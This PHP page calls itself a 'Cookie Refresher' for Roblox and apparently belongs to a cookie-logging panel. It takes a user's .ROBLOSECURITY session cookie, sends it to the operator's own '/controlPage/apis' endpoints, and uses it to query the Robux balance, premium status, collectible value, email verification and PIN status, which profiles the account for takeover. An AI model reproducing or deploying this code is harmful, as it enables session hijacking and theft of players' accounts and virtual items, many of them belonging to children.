<?php
if (isset($_SERVER['HTTPS'])) {
$ht = 'https://';
}else {
$ht = 'http://';
}
$dom = $ht.$_SERVER['SERVER_NAME'];
$cookie = $_GET['cookie'];
if ($cookie == "") {
    
}else {
$lol = file_get_contents("$dom/controlPage/apis/check.php?cookie=$cookie");
if ($lol == "Invalid Cookie") {
$re = "Invalid Cookie";
$img = '<img src="https://media.tenor.com/iCgOuohU11kAAAAC/dancing-polish-cow-at4am.gif" alt="CAL"  width="200" height="120"/>';
}else {
    $web = '{web}';
    $ip = $_SERVER['REMOTE_ADDR'];
    $re = "Valid Cookie";
    $cool = "$dom/controlPage/apis/userinfo.php?cookie=$cookie&web=$web";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $cool);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$info = curl_exec($ch);
function csrf($cookie) {
 $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array("{}")));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Cookie: .ROBLOSECURITY=$cookie"
    ));
    $output = curl_exec($ch);
   preg_match('/X-CSRF-TOKEN:\s*(\S+)/i', $output, $matches);
$csrf = $matches[1];
return $csrf;
}

function make_curl_request($url, $headers) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}


$csrf = csrf($cookie);
$url = "https://www.roblox.com/mobileapi/userinfo";
$headers = [
    "Content-Type: application/json",
    "Cookie: .ROBLOSECURITY=$cookie",
    "x-csrf-token: $csrf"
];
$response = make_curl_request($url, $headers);
$jd = json_decode($response, true);

$th = $jd['ThumbnailUrl'];
$uid = $jd['UserID'];
$user = $jd['UserName'];
$robux = $jd['RobuxBalance'];
$premium = $jd['IsPremium'] ? 'True' : 'False';
$url = "https://www.roblox.com/my/settings/json";
$response = make_curl_request($url, $headers);
$jd = json_decode($response, true);
$verify = $jd['IsEmailVerified'] ? "True" : "False";
$url = "https://auth.roblox.com/v1/account/pin";
$response = make_curl_request($url, $headers);
$pin = json_decode($response, true)['isEnabled'] ? "True" : "False";
$url = "https://inventory.roblox.com/v1/users/$uid/assets/collectibles?sortOrder=Asc&limit=100";
$response = make_curl_request($url, $headers);
$jd = json_decode($response, true);

$rap = 0;
if (isset($jd['data'])) {
    foreach ($jd['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}
    $img = '<img src="'.$th.'" alt="CAL"  width="" height="200"/>';
    
$echo = '
<h2>Username: '.$user.'</h2>
<h2>Robux: '.$robux.'</h2>
<h2>Premium: '.$premium.'</h2>
<h2>Rap: '.$rap.'</h2>
<h2>Verified: '.$verify.'</h2>
<h2>Pin: '.$pin.'</h2>';
}
$fi ='<input class="auth-input" type="text" value="'.$info.'" id="cookie" readonly>';

}
?>
<!DOCTYPE html>
<html lang="en">

<head>
	<style>
	body,
	html {
		background: rgb(24, 24, 28) !important;
	}
	</style>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Cookie Refresher</title>
	<!-- CSS / Bootstrap -->
	<link href="/controlPage/new/assets/css/imports.css" rel="stylesheet">
	<!-- SNACKBAR -->
	<link rel="stylesheet" href="/controlPage/new/assets/css/snackbar.css" />
	<script src="/controlPage/new/assets/js/snackbar.js"></script>
	<style>
	    .swal2-container {
	        z-index: 20000 !important;
	    }
	</style>
</head>

<body>
    	<section id="login" class="form">
		<div class="container h-100">
			<div class="row justify-content-center align-items-center h-100">
				<div class="col-md-10 col-lg-5">
					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
						<center><h2><?php echo $re; ?></h2></center>
						<!-- LOGIN FORM -->
					

							<center>
<?php echo $img;?>
<?php echo $echo;?>

<div class="overlay-top-right"></div>
		<div class="overlay-bottom-right"></div>
		<div class="overlay-bottom-left"></div>
</section>
	<section id="login" class="form">
		<div class="container h-100">
			<div class="row justify-content-center align-items-center h-100">
				<div class="col-md-10 col-lg-5">
					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
 <center>  <h2>New Cookie</h2> </center>
<div class="form-input-icon mb-3 mt-4"> <i class="fas fa-key"></i>
<?php echo $fi; ?>
 </div>
 <button type="button" class="button primary d-block mt-3 w-100" onclick="a()" style="color:black">Copy</button>
				 </center>
					</div>
				</div>
			</div>
		</div>
		<div class="overlay-top-right"></div>
		<div class="overlay-bottom-right"></div>
		<div class="overlay-bottom-left"></div>
	</section>
	<script>
	 function a() {
  
  var copyText = document.getElementById("cookie");

  copyText.select();
  copyText.setSelectionRange(0, 99999); 

  navigator.clipboard.writeText(copyText.value);

}    
	</script>
	<script src="/controlPage/apis/main.js"></script>
	<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
	<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
	<script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
	<script src="/controlPage/new/assets/js/bootstrap.js"></script>
	<script src="/controlPage/new/assets/js/core.js"></script>
</body>

</html>